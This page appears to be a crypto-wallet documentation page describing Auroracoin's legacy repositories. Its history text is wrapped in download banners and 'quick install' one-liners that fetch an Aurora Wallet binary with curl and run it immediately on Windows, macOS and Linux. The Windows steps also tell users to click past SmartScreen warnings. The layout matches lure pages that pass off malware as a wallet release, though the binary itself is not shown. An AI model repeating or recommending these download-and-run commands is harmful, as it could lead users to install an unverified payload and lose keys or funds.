![Aurora Wallet legacy repositories explained guide](assets/aurora-wallet-guide-article-banner.png)

# Auroracoin legacy repositories: what each historical project did

The five reference repositories behind the early network, and why they stay public.

## Downloads - 2026.08.1.0

<p align="center"><a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`aurora-wallet-v2026.08.1.0.exe`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`aurora-wallet-v2026.08.1.0.dmg`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`aurora-wallet-v2026.08.1.0.zip`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip) |


The older repositories on the account are the written history of the network: core client, explorer, node layer and Java library.

Each one solved a problem of its era. Reading them in order explains how Auroracoin functioned before the desktop wallet existed, and why the current stack is smaller than the sum of its parts.


<!-- ARTICLE-BODY-BEGIN -->

## The core client

The `auroracoin-old` repository holds the C++ full-node client, a descendant of the Bitcoin 0.8 codebase adapted for Auroracoin's block interval, reward schedule and address format. It carried the network from launch, validated every block and stored keys in the wallet file format that the modern wallet still reads.

The build is Autotools based, and the source is the reference for how a legacy wallet file was written.

## The explorer stack

Three repositories made the public block explorer work. `bitcore-node` was the service layer that connected a full node to applications, with a bus and a set of services that turned block and transaction events into stored data. `insight-api` was the REST and WebSocket service that answered explorer queries from that index. `insight-ui` was the AngularJS front end that rendered blocks, transactions and addresses to the public.

Together they show the complete path of an explorer request, which is why they remain useful to anyone building a chain viewer today.

## The Java library

`bitcoinj-scrypt` extended bitcoinj with scrypt proof-of-work support and the Auroracoin network parameters, which let Java and Android clients build wallets without running a full node. The repository includes a JavaFX wallet template that doubled as a starting point for third-party applications.

## Why they stay public

Public history is auditable history. An auditor can compare the rules a block was validated under with the code that implemented them, and a holder can read the file format that holds an old balance before importing it.

The current application is a separate repository with its own release process. <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/27-migrate-from-auroracoin-core.md">Migrating from Auroracoin Core</a> explains how a balance moves from the historical client into the desktop wallet, and <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/22-import-wallet-dat.md">importing a wallet.dat</a> covers the file itself.

Reading the history is not a reason to run it. The wallet that receives current blocks and current fixes is the <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest">latest Aurora Wallet release</a>, and it is the only build this library asks you to install.

## FAQ

### Can I still build the old core client?

The source and build notes are present. Expect the library versions of its period, which a current system does not ship by default.

### Do the old repositories receive updates?

They are preserved as written. Changes to the wallet, the guides and the releases happen in the current repositories.

<!-- ARTICLE-BODY-END -->


## How to install Aurora Wallet

### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe">aurora-wallet-v2026.08.1.0.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

Check the download: run the command below and compare the result with `f9fdc62a9566b61a1dae689b5aaa1a2df3fcb3e0270a5d2d4bd32e937b924049`.

```cmd
certutil -hashfile setup.exe SHA256
```

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg">aurora-wallet-v2026.08.1.0.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

Check the download: run the command below and compare the result with `2c0fd3f9a9c7ff4df8d10621be1b9284262b4a32109887768c259bc3fb5699f9`.

```bash
shasum -a 256 setup.dmg
```

### Linux
Quick install (Terminal):

```bash
curl -fLo app.zip https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip && unzip -o app.zip && chmod +x aurora-wallet && ./aurora-wallet
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip">aurora-wallet-v2026.08.1.0.zip</a>.
2. Extract the archive.
3. Run `aurora-wallet`.

Check the download: run the command below and compare the result with `fcf7350d8f38256031aa2060bded8898f71cae2cd9613d19fdc0c3e37267717a`.

```bash
sha256sum app.zip
```


## Related guides

- [Migrate from Auroracoin Core](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/27-migrate-from-auroracoin-core.md)
- [Import a wallet.dat](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/22-import-wallet-dat.md)
- [What is Auroracoin](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/37-what-is-auroracoin-aur.md)
- [What is Aurora Wallet](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/01-what-is-aurora-wallet.md)
